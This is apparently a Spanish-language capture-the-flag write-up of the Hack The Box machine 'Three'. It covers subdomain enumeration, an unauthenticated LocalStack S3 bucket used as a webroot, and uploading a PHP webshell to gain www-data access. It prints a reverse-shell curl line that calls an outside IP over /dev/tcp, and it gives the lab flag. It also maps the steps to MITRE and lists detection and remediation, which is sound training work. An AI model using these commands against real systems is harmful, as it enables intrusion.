---
tags:
  - htb
  - starting-point
  - tier-1
  - easy
  - linux
  - aws-s3
  - misconfiguration
  - localstack
  - terminada
ip: 10.129.154.8
os: Linux
difficulty: Easy
status: terminada
tiempo: 2h 0m
fecha_inicio: 2026-08-22
fecha_completada: 2026-09-06
puntos: 20
mitre_tactics:
  - Reconnaissance
  - Initial Access
mitre_techniques:
  - T1595.002
  - T1190
---

# 🖥️ Three — Linux — Easy (Tier 1)

> [!info] Resumen
> **IP:** `10.129.154.8` | **OS:** Linux | **Tier/Fase:** 1 | **Tiempo:** 2h
> Un subdominio expone LocalStack (emulador de AWS para desarrollo) sin autenticación real. El bucket S3 que sirve es el webroot del sitio: se sube un webshell PHP vía `aws s3 cp` y se obtiene ejecución de comandos como `www-data`.

---

## 1. Reconocimiento

```bash
nmap -sCV -p- --min-rate 5000 10.129.154.8 -oN nmap.txt
```

| Puerto | Servicio | Versión             | Hallazgo clave                                                                                                                                                                                                  |
| ------ | -------- | ------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 22/TCP | ssh      | OpenSSH 7.6 Ubuntu  | ssh-hostkey: <br>2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)<br>256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)<br>256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)<br> |
| 80/TCP | http     | Apache httpd 2.4.29 | Sección de contacto del sitio revela el dominio `thetoppers.htb`                                                                                                                                                |

**→ Vector:** virtual host → subdominio S3 → bucket sin auth → RCE

---

## 2. Explotación

> Vector principal: AWS S3 bucket misconfiguration (bucket público de lectura/escritura sirviendo de webroot)

```bash
# Paso 1: agregar el dominio principal encontrado en el sitio a /etc/hosts
echo "10.129.154.8 thetoppers.htb" | sudo tee -a /etc/hosts

# Paso 2: descubrir subdominios con gobuster vhost
gobuster vhost -u http://thetoppers.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
# Si seclists no está instalado: sudo apt update && sudo apt install seclists -y
# Alternativa sin instalar nada: /usr/share/wordlists/dirb/common.txt (más chica, menos hits)

# Paso 3: agregar el subdominio S3 descubierto a /etc/hosts también (s3.thetoppers.htb)
echo "10.129.154.8 s3.thetoppers.htb" | sudo tee -a /etc/hosts

# Paso 4: configurar awscli con credenciales dummy (el bucket no valida auth real)
aws configure
# AWS Access Key ID: cualquier-valor
# AWS Secret Access Key: cualquier-valor
# Default region: us-east-1
# Default output format: json

# Paso 5: listar el contenido del bucket — CONFIRMADO: bucket = thetoppers.htb (coincide con el dominio)
aws s3 ls s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb

# Paso 6: subir un webshell PHP al bucket (que ES el webroot del sitio) — CONFIRMADO exitoso
aws s3 cp shell.php s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb
# upload: ./shell.php to s3://thetoppers.htb/shell.php

# Paso 7: listener + disparar el shell vía navegador/curl
nc -lvnp 4444
curl "http://thetoppers.htb/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
curl "http://thetoppers.htb/shell.php?cmd=bash+-c+'bash+-i+>/dev/tcp/10.10.15.233/4444+0>%261'"
# pwd
# /var/www/html
# cd ..
# ls
# flag.txt
# html
# cat flag.txt
a980d99281a28d638ac68b9bf9453c2b
```

> [!success] Flag / Acceso obtenido
> usuario: `www-data`, flag en `/var/www/flag.txt`

---

## 3. Escalación de Privilegios

N/A esperado — Tier 1 apunta a foothold, no post-explotación completa. Confirmar al resolver.

---

## 4. MITRE ATT&CK

| Táctica         | Técnica                             | ID        | Uso en esta máquina |
| ---------------- | -------------------------------------- | --------- | -------------------- |
| Reconnaissance   | Active Scanning: Vulnerability Scanning | T1595.002 | Enumeración de subdominios revela el bucket S3 |
| Initial Access   | Exploit Public-Facing Application      | T1190     | Escritura arbitraria en el bucket público → webshell servido públicamente |

---

## 5. Detección & Remediación

**Blue Team detecta:**
- Requests HTTP a rutas/subdominios de storage (`s3.*`) con verbos PUT/POST no esperados desde IPs externas
- Aparición de un archivo `.php` nuevo en el bucket sin pasar por el pipeline de deploy conocido
- Ejecución de comandos del sistema iniciada por el proceso del servidor web (Apache/PHP-FPM) inmediatamente después de una request con parámetro sospechoso (`?cmd=`)

**Remediación:**
- Bucket policy: denegar `s3:PutObject`/`s3:GetObject` públicos: solo el pipeline de deploy autorizado debería poder escribir
- No servir un bucket de object storage directamente como webroot de una aplicación — usar una capa de despliegue controlada en medio
- WAF o validación de tipo de archivo si el bucket debe aceptar cargas de usuarios (bloquear `.php`, `.jsp`, etc. en buckets públicos)

---

## 6. Lecciones

- El bucket no era S3 real, era LocalStack. No valida credenciales por defecto salvo que se active `ENFORCE_IAM`. Por eso `aws configure` con valores dummy funcionó igual.
- El nombre del bucket coincidía con el dominio principal (`thetoppers.htb`). Antes de enumerar buckets a ciegas conviene probar ese patrón primero.
- Los headers HTTP (`Server`, `Access-Control-Allow-Headers`) identifican el software real detrás de un subdominio. Confiar en eso es más seguro que asumir el nombre de una herramienta a partir de un writeup de terceros.

**Bloqueado:**

| Fase | Causa | Fix |
|------|-------|-----|
| 2 | seclists no instalado por defecto en Kali; tab-completion en `/usr/share/` no lo mostraba | `sudo apt install seclists` (queda en `/usr/share/wordlists/seclists/`, no en `/usr/share/seclists/`) o usar `/usr/share/wordlists/dirb/common.txt` sin instalar nada |

---

## 7. Conexiones

- Similar: [[HTB/Appointment/Appointment]], [[HTB/Sequel/Sequel]] (explotación de aplicación pública, distinta superficie: SQLi/MySQL vs cloud storage)
- Técnica: [[Técnicas/3_Explotación/AWS-S3-Misconfiguration]]

**Referencias:** [MITRE T1190](https://attack.mitre.org/techniques/T1190/) · [MITRE T1595.002](https://attack.mitre.org/techniques/T1595/002/) · [AWS S3 Security Best Practices](https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html)
